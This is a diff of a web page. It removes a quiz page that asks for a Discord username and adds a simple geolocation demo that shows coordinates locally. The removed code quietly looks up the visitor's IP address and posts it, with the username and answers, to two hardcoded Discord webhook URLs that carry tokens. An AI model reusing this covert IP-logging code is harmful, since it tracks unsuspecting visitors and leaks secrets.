@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blobster - Main</title>
-    <link rel="icon" type="image/png" href="https://www.artstation.com/artwork/Dv03yo">
+    <title>Location-Based Service</title>
     <style>
         body {
             display: flex;
@@ -12,233 +11,70 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-image: linear-gradient(to bottom, #0d1117, #172659);
-            color: white;
+            background-color: #f0f0f0;
             font-family: Arial, sans-serif;
         }
         .container {
             text-align: center;
-            background-image: linear-gradient(to bottom, #0d1117, #172659);
             padding: 40px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            transition: opacity 0.5s ease;
-            opacity: 1;
-            outline: 1px solid white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background-color: white;
         }
-        input[type="text"] {
-            padding: 10px;
+        button {
+            padding: 10px 20px;
             font-size: 18px;
-            margin-bottom: 20px;
-            border: none;
-            border-radius: 5px;
-            width: calc(100% - 22px);
-        }
-        #clickMeBtn, .nextBtn {
-            padding: 20px 40px;
-            font-size: 24px;
             color: white;
             background-color: green;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
-        #clickMeBtn:disabled, .nextBtn:disabled {
+        button:disabled {
             background-color: grey;
             cursor: not-allowed;
-        }
-        #clickMeBtn:hover:enabled, .nextBtn:hover:enabled {
-            background-color: darkgreen;
-        }
-        #clickMeBtn.shake, .nextBtn.shake {
-            animation: shake 0.5s ease;
-        }
-        @keyframes shake {
-            0% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            50% { transform: translateX(5px); }
-            75% { transform: translateX(-5px); }
-            100% { transform: translateX(0); }
-        }
-        label {
-            font-size: 18px;
-            margin-bottom: 10px;
-            display: block;
-        }
-        #secondScreen, .quizScreen {
-            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container" id="firstScreen">
-        <h1>Welcome to the Quiz!</h1>
-        <p>Please enter your Discord username to proceed: (Please be truthful).</p>
-        <label for="discordUsername">Enter your Discord username:</label>
-        <input type="text" id="discordUsername" placeholder="Discord user - Do not use a display" maxlength="32"> <!-- Added maxlength attribute -->
-        <br>
-        <button id="clickMeBtn" disabled>START QUIZ!</button>
-    </div>
-
-    <div class="container quizScreen" id="quizScreen1">
-        <h1>Quiz Question 1</h1>
-        <p>What is your favorite color?</p>
-        <input type="text" id="answer1" placeholder="Enter your answer">
-        <br>
-        <button class="nextBtn" disabled>Next</button>
-    </div>
-
-    <div class="container quizScreen" id="quizScreen2">
-        <h1>Quiz Question 2</h1>
-        <p>What is your favorite animal?</p>
-        <input type="text" id="answer2" placeholder="Enter your answer">
-        <br>
-        <button class="nextBtn" disabled>Next</button>
-    </div>
-
-    <div class="container quizScreen" id="quizScreen3">
-        <h1>Quiz Question 3</h1>
-        <p>What is your favorite food?</p>
-        <input type="text" id="answer3" placeholder="Enter your answer">
-        <br>
-        <button class="nextBtn" disabled>Next</button>
-    </div>
-
-    <div class="container" id="secondScreen">
-        <h1>Thank you for your response!</h1>
-        <p>Your response will be used as larger data.</p>
+    <div class="container">
+        <h1>Find Your Location</h1>
+        <p>Click the button below to allow us to access your location.</p>
+        <button id="getLocationBtn">Get Location</button>
+        <p id="locationInfo"></p>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const discordUsernameInput = document.getElementById('discordUsername');
-            const clickMeBtn = document.getElementById('clickMeBtn');
-            const firstScreen = document.getElementById('firstScreen');
-            const secondScreen = document.getElementById('secondScreen');
-            const quizScreens = document.querySelectorAll('.quizScreen');
-            let currentQuizScreen = 0;
-
-            discordUsernameInput.addEventListener('input', () => {
-                const value = discordUsernameInput.value.trim();
-                clickMeBtn.disabled = !value || value.includes(' ');
-            });
-
-            const enableNextButton = (inputId, button) => {
-                const input = document.getElementById(inputId);
-                input.addEventListener('input', () => {
-                    button.disabled = !input.value.trim();
-                });
-            };
-
-            const showNextScreen = () => {
-                if (currentQuizScreen < quizScreens.length) {
-                    quizScreens[currentQuizScreen].style.display = 'none';
-                    currentQuizScreen++;
-                    if (currentQuizScreen < quizScreens.length) {
-                        quizScreens[currentQuizScreen].style.display = 'block';
-                    } else {
-                        secondScreen.style.display = 'block';
-                        sendQuizResults();
-                    }
-                }
-            };
-
-            const sendQuizResults = () => {
-                const answers = [];
-                quizScreens.forEach((screen, index) => {
-                    const question = screen.querySelector('h1').textContent;
-                    const answer = document.getElementById(`answer${index + 1}`).value.trim();
-                    answers.push(`${question}: ${answer}`);
-                });
-                const username = discordUsernameInput.value.trim().substring(0, 32); // Cap at 32 characters
-                const webhookUrlQuiz = 'https://discord.com/api/webhooks/1244329926648402020/3CEaFEiftHTcq7eRALLvs2guKYjK51GXGuPNVMtjlkdeCv5Ach2kekBVqiS3BR-9zUN7';
-                const messageQuiz = {
-                    content: answers.join('\n') + `\nUsername: ${username}`
-                };
-                const webhookUrlIP = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
-                const messageIP = {
-                    content: `!IP: ${ip}, Username: ${username}`
-                };
-
-                fetch(webhookUrlQuiz, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(messageQuiz)
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send quiz webhook request');
-                    }
-                })
-                .catch(error => console.error('ERROR', error));
-
-                fetch(webhookUrlIP, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(messageIP)
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send IP webhook request');
-                    }
-                })
-                .catch(error => console.error('ERROR', error));
-            };
-
-            clickMeBtn.addEventListener('click', () => {
-                const discordUsername = discordUsernameInput.value.trim();
-                if (!discordUsername || discordUsername.includes(' ')) {
-                    clickMeBtn.classList.add('shake');
-                    setTimeout(() => clickMeBtn.classList.remove('shake'), 500);
-                    return;
-                }
-
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        const ip = data.ip;
-                        sendIPandUsername(ip, discordUsername);
-                        firstScreen.style.opacity = 0;
-                        quizScreens[currentQuizScreen].style.display = 'block';
-                    })
-                    .catch(error => console.error('ERROR', error));
-            });
-
-            const sendIPandUsername = (ip, username) => {
-                const webhookUrlIP = 'https://discord.com/api/webhooks/1244328967247499356/1V6jytPrHM7qqbx7r-1Qp4fogxUS6stFDPEBphEsZW7COnvcOnULsKcBaIYyOpTt_bEH';
-                const messageIP = {
-                    content: `!IP: ${ip}, Username: ${username}`
-                };
-
-                fetch(webhookUrlIP, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(messageIP)
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send IP webhook request');
-                    }
-                })
-                .catch(error => console.error('ERROR', error));
-            };
-
-            const nextButtons = document.querySelectorAll('.nextBtn');
-            nextButtons.forEach((button, index) => {
-                enableNextButton(`answer${index + 1}`, button);
-                button.addEventListener('click', showNextScreen);
-            });
+        document.getElementById('getLocationBtn').addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById('locationInfo').textContent = "Geolocation is not supported by this browser.";
+            }
         });
+
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            document.getElementById('locationInfo').textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById('locationInfo').textContent = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById('locationInfo').textContent = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById('locationInfo').textContent = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById('locationInfo').textContent = "An unknown error occurred.";
+                    break;
+            }
+        }
     </script>
 </body>
 </html>
